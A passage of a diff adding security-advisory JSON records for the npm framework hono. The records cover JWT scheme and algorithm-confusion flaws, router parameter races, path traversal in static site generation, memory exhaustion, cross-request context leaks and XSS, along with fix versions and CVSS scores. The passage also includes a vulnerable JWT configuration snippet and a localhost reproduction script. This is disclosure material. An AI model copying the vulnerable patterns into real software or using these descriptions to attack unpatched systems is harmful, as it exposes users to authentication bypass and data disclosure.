+    "details": "### Summary\n\nThe `jwt` and `jwk` middlewares do not verify that the `Authorization` header value uses the`Bearer` scheme. Any two-part header value \u2014 regardless of the scheme name in the first position \u2014 proceeds to JWT verification. A request presenting a valid JWT under a non-`Bearer` scheme identifier (such as `Basic` or `Token`) is authenticated identically to a correctly formed `Bearer` request.\n\n### Details\n\nWhen processing an `Authorization` (or custom) header, the middleware splits the value on whitespace and uses the second token as the JWT to verify. It does not check that the first token is `bearer` (case-insensitively). RFC 6750 specifies that JWT bearer tokens must be presented using the `Bearer` scheme; other scheme identifiers carry distinct semantics and may be subject to different policies in network-layer security controls.\n\nThis discrepancy means that scheme-aware external controls \u2014 such as WAF rules, API gateways, or reverse proxies that apply policies specific to the `Bearer` scheme identifier \u2014 can be bypassed by presenting a valid JWT under a different scheme name.\n\nThis issue affects `hono/jwt` and `hono/jwk` middleware.\n\n### Impact\n\nAn attacker who possesses a valid JWT may present it under a non-`Bearer` scheme identifier and still pass middleware authentication.\n\nThis may lead to:\n\n- Bypass of network-layer security controls that inspect or filter requests based on the authorization scheme identifier\n- Token reuse across authentication schemes in applications that use multiple authorization mechanisms\n\nThis issue affects applications where `hono/jwt` or `hono/jwk` authentication is combined with external controls that enforce scheme-based access policies.",
+    "aliases": [
+     "CVE-2026-47673"
+    ],
+    "modified": "2026-09-10T03:50:49.224229164Z",
+    "published": "2026-06-04T17:52:04Z",
+    "database_specific": {
+     "nvd_published_at": "2026-05-28T17:16:32Z",
+     "cwe_ids": [
+      "CWE-285"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-06-04T17:52:04Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-f577-qrjj-4474"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-47673"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/5463db2735476959b8af67756f4e513f4fe19115"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.21"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.21"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-f577-qrjj-4474/GHSA-f577-qrjj-4474.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-f67f-6cw9-8mq4",
+    "summary": "Hono JWT Middleware's JWT Algorithm Confusion via Unsafe Default (HS256) Allows Token Forgery and Auth Bypass",
+    "details": "## Summary\n\nA flaw in Hono\u2019s JWK/JWKS JWT verification middleware allowed the JWT header\u2019s `alg` value to influence signature verification when the selected JWK did not explicitly specify an algorithm. This could enable **JWT algorithm confusion** and, in certain configurations, allow forged tokens to be accepted.\n\n## Details\n\nWhen verifying JWTs using JWKs or a JWKS endpoint, the middleware selected the verification algorithm based on the JWK\u2019s `alg` field if present, but otherwise fell back to the `alg` value provided in the unverified JWT header.\n\nBecause the `alg` field in a JWK is optional and often omitted in real-world JWKS configurations, this behavior could allow an attacker to control the algorithm used for verification. In some environments, this may lead to authentication or authorization\nbypass through crafted tokens.\n\nThe practical impact depends on application configuration, including which algorithms are accepted and how JWTs are used for authorization decisions.\n\n## Impact\n\nIn affected configurations, an attacker may be able to forge JWTs with attacker-controlled claims, potentially resulting in authentication or authorization bypass.\n\nApplications that do not use the JWK/JWKS middleware, do not rely on JWT-based authentication, or explicitly restrict allowed algorithms are not affected.\n\n## Resolution\n\nUpdate to the latest patched release.\n\n**Breaking change:**\n\nAs part of this fix, the JWT middleware now requires the `alg` option to be explicitly specified. This prevents algorithm confusion by ensuring that the verification algorithm is not derived from untrusted JWT header values.\n\nApplications upgrading must update their configuration accordingly.\n\n### Before (vulnerable configuration)\n\n```ts\nimport { jwt } from 'hono/jwt'\n\napp.use(\n  '/auth/*',\n  jwt({\n    secret: 'it-is-very-secret',\n    // alg was optional\n  })\n)\n```\n\n### After (patched configuration)\n\n```ts\nimport { jwt } from 'hono/jwt'\n\napp.use(\n  '/auth/*',\n  jwt({\n    secret: 'it-is-very-secret',\n    alg: 'HS256', // required\n  })\n)\n```",
+    "aliases": [
+     "CVE-2026-22817"
+    ],
+    "modified": "2026-09-10T03:50:33.087422192Z",
+    "published": "2026-01-13T21:51:44Z",
+    "database_specific": {
+     "nvd_published_at": "2026-01-13T20:16:11Z",
+     "cwe_ids": [
+      "CWE-347"
+     ],
+     "severity": "HIGH",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-01-13T21:51:44Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-f67f-6cw9-8mq4"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22817"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/cc0aa7ae327ed84cc391d29086dec2a3e44e7a1f"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.11.4"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-f67f-6cw9-8mq4/GHSA-f67f-6cw9-8mq4.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-f6gv-hh8j-q8vq",
+    "summary": "Named path parameters can be overridden in TrieRouter",
+    "details": "### Impact\n\nThe clients may override named path parameter values from previous requests if the application is using TrieRouter. So, there is a risk that a privileged user may use unintended parameters when deleting REST API resources.\n\nTrieRouter is used either explicitly or when the application matches a pattern that is not supported by the default RegExpRouter.\n\nThe code to reproduce it. The server side application:\n\n```ts\nimport { Hono } from 'hono'\nimport { TrieRouter } from 'hono/router/trie-router'\n\nconst wait = async (ms: number) => {\n  return new Promise((resolve) => {\n    setTimeout(resolve, ms)\n  })\n}\n\nconst app = new Hono({ router: new TrieRouter() })\n\napp.use('*', async (c, next) => {\n  await wait(Math.random() * 200)\n  return next()\n})\n\napp.get('/modules/:id/versions/:version', async (c) => {\n  const id = c.req.param('id')\n  const version = c.req.param('version')\n\n  console.log('path', c.req.path)\n  console.log('version', version)\n\n  return c.json({\n    id,\n    version,\n  })\n})\n\nexport default app\n```\n\nThe client code which makes requests to the server application:\n\n```ts\nconst examples = [\n  'http://localhost:8787/modules/first/versions/first',\n  'http://localhost:8787/modules/second/versions/second',\n  'http://localhost:8787/modules/third/versions/third',\n]\n\nconst test = () => {\n  for (const example of examples) {\n    fetch(example)\n      .then((response) => response.json())\n      .then((data) => {\n        const splitted = example.split('/')\n        const expected = splitted[splitted.length - 1]\n\n        if (expected !== data.version) {\n          console.error(`Error: exprected ${expected} but got ${data.version} - url was ${example}`)\n        }\n      })\n  }\n}\n\ntest()\n```\n\nThe results:\n\n```txt\nError: exprected second but got third - url was http://localhost:8787/modules/second/versions/second\nError: exprected first but got third - url was http://localhost:8787/modules/first/versions/first\n```\n\n### Patches\n\n\"v3.11.7\" includes the change to fix this issue.\n\n### Workarounds\n\nDon't use TrieRouter directly.\n\n```ts\n// DON'T USE TrieRouter\nimport { TrieRouter } from 'hono/router/trie-router'\nconst app = new Hono({ router: new TrieRouter() })\n```\n\n### References\n\nRouter options on the Hono website: https://hono.dev/api/hono#router-option",
+    "aliases": [
+     "CVE-2023-50710"
+    ],
+    "modified": "2026-09-10T03:50:08.982102347Z",
+    "published": "2023-12-15T02:45:54Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-94"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2023-12-15T02:45:54Z",
+     "nvd_published_at": "2023-12-14T18:15:45Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-f6gv-hh8j-q8vq"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-50710"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/8e2b6b08518998783f66d31db4f21b1b1eecc4c8"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v3.11.7"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "3.11.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-f6gv-hh8j-q8vq/GHSA-f6gv-hh8j-q8vq.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:L"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-g6gw-c38x-mqfc",
+    "summary": "Hono: Unbounded dot-notation nesting in `parseBody()` can cause memory exhaustion",
+    "details": "### Summary\n\nWhen `parseBody()` expands dot-separated form field names into nested objects, it does not limit the nesting depth or the total number of objects created. A request body well within a normal size limit can therefore allocate an object graph far larger than the request itself, and concurrent requests can exhaust the heap and terminate the process.\n\n### Details\n\nEach dot-separated segment of a field name creates an intermediate object. Neither the segments within a single field name nor the total across a request was bounded, and empty segments were preserved, so a field name could encode one nesting level per byte.\n\nBoth shapes produce the effect: a single deeply dotted field name, and a large number of shallowly dotted ones within one body. A request body size limit does not prevent it, because the amplification happens after the body has been accepted.\n\nDot-notation parsing is not enabled by default.\n\n### Impact\n\nAn attacker who can reach an endpoint that parses request bodies with dot-notation enabled can send concurrent requests whose memory cost is disproportionate to their size.\n\nThis may lead to:\n\n- exhaustion of the JavaScript heap and termination of the server process\n- the service remaining unavailable until it is restarted\n\nThis issue affects applications that explicitly enable dot-notation parsing. Applications using the default behaviour are not affected.",
+    "aliases": [
+     "CVE-2026-84364"
+    ],
+    "modified": "2026-09-08T21:30:05.512225825Z",
+    "published": "2026-09-08T21:23:02Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-09-08T21:23:02Z",
+     "nvd_published_at": "2026-09-01T21:18:47Z",
+     "cwe_ids": [
+      "CWE-400"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-g6gw-c38x-mqfc"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-84364"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/531e9c5a3ae058d10de33f643055bd4009a87178"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.13.5"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.13.5"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-g6gw-c38x-mqfc/GHSA-g6gw-c38x-mqfc.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-gq3j-xvxp-8hrf",
+    "summary": "Hono added timing comparison hardening in basicAuth and bearerAuth",
+    "details": "## Summary\n\nThe `basicAuth` and `bearerAuth` middlewares previously used a comparison that was not fully timing-safe.\n\nThe `timingSafeEqual` function used normal string equality (`===`) when comparing hash values. This comparison may stop early if values differ, which can theoretically cause small timing differences.\n\nThe implementation has been updated to use a safer comparison method.\n\n\n## Details\n\nThe issue was caused by the use of normal string equality (`===`) when comparing hash values inside the `timingSafeEqual` function.\n\nIn JavaScript, string comparison may stop as soon as a difference is found. This means the comparison time can slightly vary depending on how many characters match.\n\nUnder very specific and controlled conditions, this behavior could theoretically allow timing-based analysis.\n\nThe implementation has been updated to:\n\n- Avoid early termination during comparison\n- Use a constant-time-style comparison method\n\n## Impact\n\nThis issue is unlikely to be exploited in normal environments.\n\nIt may only be relevant in highly controlled situations where precise timing measurements are possible.\n\nThis change is considered a security hardening improvement. Users are encouraged to upgrade to the latest version.",
+    "aliases": [
+     "CVE-2026-56764"
+    ],
+    "modified": "2026-09-10T03:50:35.112615157Z",
+    "published": "2026-02-19T20:15:59Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-02-19T20:15:59Z",
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-208"
+     ],
+     "severity": "LOW",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-gq3j-xvxp-8hrf"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/91def7cab654bad5eecc9270e6620d577971ff5e"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.11.10"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.11.10"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-gq3j-xvxp-8hrf/GHSA-gq3j-xvxp-8hrf.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-gqvv-2mrq-wpjv",
+    "summary": "Hono: Incomplete fix for CVE-2026-39408: `toSSG()` still writes files outside the output directory",
+    "details": "### Summary\n\nThe fix released for CVE-2026-39408 does not cover every traversal sequence. `toSSG()` can still write files outside the configured output directory when a route parameter contains consecutive parent-directory segments.\n\n### Details\n\nStatic site generation builds each output path from the route path and the values supplied through `ssgParams`, then verifies that the result stays inside the output directory. That check normalizes the path with the same routine that built it, and the routine did not fully collapse runs of consecutive parent-directory segments. A value carrying enough of them produces a path the check accepts, but the filesystem resolves outside the output directory.\n\nThe earlier fix handled a single parent-directory segment, so it blocks the sequence reported at the time while leaving longer runs unhandled. The check also treated output directories that differ only in how they are rooted as equivalent.\n\nThis arises when an application generates a static site from route parameter values it does not fully control \u2014 slugs coming from a CMS, an API, or user submissions.\n\n### Impact\n\nA value reaching `ssgParams` from an untrusted source can cause build output to be written outside the intended output directory, carrying whatever content the route handler produced.\n\nThis may lead to:\n\n- files being created or overwritten elsewhere in the build environment\n- generated artifacts or deployment output being altered\n\nThis affects build-time static site generation only; request-time routing is not affected. Applications whose `ssgParams` values are entirely developer-controlled are not affected.",
+    "aliases": [
+     "CVE-2026-84365"
+    ],
+    "modified": "2026-09-08T21:30:04.760578762Z",
+    "published": "2026-09-08T21:23:51Z",
+    "database_specific": {
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-09-08T21:23:51Z",
+     "nvd_published_at": "2026-09-01T21:18:47Z",
+     "cwe_ids": [
+      "CWE-22"
+     ],
+     "severity": "MODERATE"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-gqvv-2mrq-wpjv"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-84365"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/3a67f7f3997e1437d108f7bcba2dbcee2df69221"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.13.5"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.13.5"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-gqvv-2mrq-wpjv/GHSA-gqvv-2mrq-wpjv.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-hm8q-7f3q-5f36",
+    "summary": "Hono has improper validation of NumericDate claims (exp, nbf, iat) in JWT verify()",
+    "details": "### Summary\n\nImproper validation of the JWT NumericDate claims `exp`, `nbf`, and `iat` in `hono/utils/jwt` allows tokens with non-spec-compliant claim values to silently bypass time-based checks. This issue is not exploitable by an anonymous attacker; it only manifests when a malformed claim value reaches `verify()` \u2014 typically when the application itself issues such tokens, or when the signing key is otherwise under attacker control.\n\n### Details\n\nThe validation routine combined option, presence, and threshold checks in a single short-circuiting expression, so several classes of malformed values were silently skipped instead of rejected:\n\n- A falsy numeric value short-circuited the presence check.\n- A non-finite numeric value compared as never-after-now and never-expired.\n- A non-numeric type produced NaN comparisons that evaluated false.\n\nThis deviates from RFC 7519 \u00a74.1.4, which defines NumericDate as a finite JSON numeric value.\n\n### Impact\n\nAn actor able to issue tokens accepted by the application may craft tokens whose `exp`, `nbf`, or `iat` claims silently bypass time-based enforcement. This may lead to:\n\n- Tokens treated as never expiring even with `exp` configured on the verifier.\n- Tokens with a future `nbf` accepted as currently valid.\n- Tokens with a future `iat` accepted as legitimately issued.\n\nDeployments using a well-formed token issuer and protecting the signing key are not affected.",
+    "aliases": [
+     "CVE-2026-44459"
+    ],
+    "modified": "2026-09-10T03:51:05.786966268Z",
+    "published": "2026-05-09T00:45:19Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-05-09T00:45:19Z",
+     "nvd_published_at": "2026-05-13T16:16:57Z",
+     "cwe_ids": [
+      "CWE-1284"
+     ],
+     "severity": "LOW",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-hm8q-7f3q-5f36"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44459"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.18"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-hm8q-7f3q-5f36/GHSA-hm8q-7f3q-5f36.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-hvrm-45r6-mjfj",
+    "summary": "hono/jsx does not isolate context per request, leading to cross-request data disclosure",
+    "details": "### Summary\n\n`hono/jsx` did not isolate context values per request during server-side rendering. While an async component was suspended on `await`, its provided context value stayed observable to other requests rendering concurrently, so `useContext()` could return a value from a different in-flight request.\n\n### Details\n\nDuring server-side rendering, context values were kept in a process-wide structure rather than scoped to each request's render. While an async component awaited, another request entering the same provider could observe or replace the value; when the first render resumed, it could read the other request's context.\n\nThis affects the usual ways request-scoped data is passed through a server-rendered JSX tree:\n\n- `createContext()` / `useContext()`\n- the `jsxRenderer` middleware and `useRequestContext()`\n\nIt arises only when context is read after an `await` inside an async component while requests render concurrently. Reading context synchronously (before any `await`), purely synchronous rendering, and client-side (DOM) rendering are not affected.\n\n### Impact\n\nUnder concurrent requests, a response could be rendered with another request's context. A user may receive HTML rendered for a different user, and an authorization check performed after an `await` may be evaluated against another user's data.\n\nThis may lead to:\n\n- disclosure of rendered output intended for another user\n- authorization decisions made with the wrong request's context\n- cross-request mixing of session or other request-scoped state",
+    "aliases": [
+     "CVE-2026-59896"
+    ],
+    "modified": "2026-09-10T03:50:12.326975538Z",
+    "published": "2026-07-21T18:34:19Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-07-21T18:34:19Z",
+     "nvd_published_at": "2026-07-08T17:17:27Z",
+     "cwe_ids": [
+      "CWE-362"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-hvrm-45r6-mjfj"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59896"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/fab3b13639339cbd5ba1166a5b23d9ac30c5f64f"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.27"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.11.8"
+         },
+         {
+          "fixed": "4.12.27"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hvrm-45r6-mjfj/GHSA-hvrm-45r6-mjfj.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-hxh3-vqpv-xpqv",
+    "summary": "hono/jsx renders plain strings unescaped in boundary components, leading to XSS",
+    "details": "### Summary\n\n`hono/jsx` does not HTML-escape a plain string placed directly as a child or `fallback` of `Suspense` or `ErrorBoundary`, as the only child of a `Context.Provider`, or as the root value of `renderToString()` / `renderToReadableStream()` from `hono/jsx/dom/server`. Such a string is emitted as markup instead of text.\n\n### Details\n\nThese paths stringify their input and treat the result as already-escaped HTML, so a plain string passes through unchanged. Notable cases:\n\n- `Suspense`: a string child, or a string `fallback` while a child suspends. With streaming, the fallback reaches the browser in the initial chunk.\n- `ErrorBoundary`: a string child alongside an asynchronous sibling. The all-synchronous case was fixed in 4.11.7 (GHSA-9r54-q6cx-xmh5).\n- `Context.Provider`: a single string child. Multiple children are escaped.\n- `hono/jsx/dom/server`: a string, or an array containing strings, passed as the root.\n\nA lone `{children}` forwarded by a wrapper component is enough to reach these paths. Strings wrapped in an element, values from `raw()` or the `html` helper, and client-side rendering with `hono/jsx/dom` are not affected.\n\n### Impact\n\nAn attacker who controls a string rendered in an affected position can inject arbitrary HTML into the server-rendered page, leading to cross-site scripting under the application's origin.\n\nThis issue affects applications that render untrusted strings directly in one of the positions above during server-side rendering.",
+    "aliases": [
+     "CVE-2026-93981"
+    ],
+    "modified": "2026-10-01T00:00:05.750907953Z",
+    "published": "2026-09-30T23:46:16Z",
+    "database_specific": {
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-79"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-09-30T23:46:16Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-hxh3-vqpv-xpqv"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-93981"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/2b8ed402cdab6dfc5e829b480806dcd8db94161e"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.13.7"
+     },
+     {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/hono-jsx-before-4.13.7-cross-site-scripting-via-unescaped-strings"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.13.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-hxh3-vqpv-xpqv/GHSA-hxh3-vqpv-xpqv.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-j6c9-x7qj-28xf",
+    "summary": "hono: AWS Lambda adapter merges multiple `Set-Cookie` headers into one value, dropping cookies on ALB single-header and Lattice",
+    "details": "### Summary\n\nOn AWS Lambda, the ALB single-header response and the VPC Lattice v2 response join multiple `Set-Cookie` headers into one comma-separated value. Because commas also appear inside cookie attributes (for example `Expires` dates), clients cannot split the value back into individual cookies and silently drop or misparse them.\n\n### Details\n\nPer RFC 6265, each cookie must be its own `Set-Cookie` header line, and commas may appear inside attribute values. Joining cookies with `\", \"` collides with those commas, producing a value that clients cannot reliably split. Only ALB single-header mode and VPC Lattice v2 are affected; API Gateway v1/v2 and ALB with multi-value headers enabled already use an array and are unaffected.\n\n### Impact\n\nA client may receive only one of the cookies, a malformed cookie, or none. Session, CSRF, or preference cookies can silently fail to apply, breaking sessions or forcing re-authentication. This affects applications that set multiple cookies per response and run on AWS Lambda behind an ALB in single-header mode (the default) or VPC Lattice v2.",
+    "aliases": [
+     "CVE-2026-54287"
+    ],
+    "modified": "2026-09-10T03:50:49.966830179Z",
+    "published": "2026-06-16T14:08:40Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-06-16T14:08:40Z",
+     "nvd_published_at": "2026-06-22T18:16:47Z",
+     "cwe_ids": [
+      "CWE-116"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-j6c9-x7qj-28xf"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54287"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.25"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-j6c9-x7qj-28xf/GHSA-j6c9-x7qj-28xf.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-m732-5p4w-x69g",
+    "summary": "Hono Improper Authorization vulnerability",
